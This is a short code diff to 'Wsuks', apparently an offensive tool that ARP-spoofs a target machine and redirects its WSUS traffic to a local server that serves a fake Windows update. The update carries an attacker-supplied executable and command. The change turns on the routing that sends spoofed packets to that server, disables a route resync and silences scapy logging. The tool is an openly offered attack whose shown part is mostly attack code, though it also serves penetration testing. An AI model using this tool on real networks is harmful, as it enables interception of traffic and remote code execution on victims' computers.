@@ -67,13 +67,15 @@ class Wsuks:
         arpspoofer = ArpSpoofer(self.interface)
         arpspoofer.start(self.targetIp, self.wsusIp)
 
+        # Set up routing to route spoofed packages to the local HTTP server
+        router = Router()
+        router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)
+
+        
         # self.logger.debug(conf.route)
         # conf.route.add(host=self.wsusIp, gw=self.hostIp)
         # self.logger.debug(conf.route)
 
-        # Prepare WSUS Update Handler
-        # router = Router()
-        # router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)
 
         update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
         update_handler.set_resources_xml(self.command)
@@ -90,7 +92,7 @@ class Wsuks:
             print("")
             self.logger.info("Stopping WSUS Server...")
         finally:
-            conf.route.resync()
+            # conf.route.resync()
             # self.logger.debug(conf.route)
             # router.stop()
             arpspoofer.stop()
@@ -110,8 +112,8 @@ def main():
     logger.debug('Passed args:\n' + pformat(vars(args)))
 
     # Prevent scapy from logging to console
-    scapyLogger = logging.getLogger('scapy')
-    scapyLogger.handlers.clear()
+    logging.getLogger('scapy').disabled = True
+    logging.getLogger("scapy.runtime").disabled = True
 
     if os.geteuid() != 0:
         logger.error("This script must be run as root!")
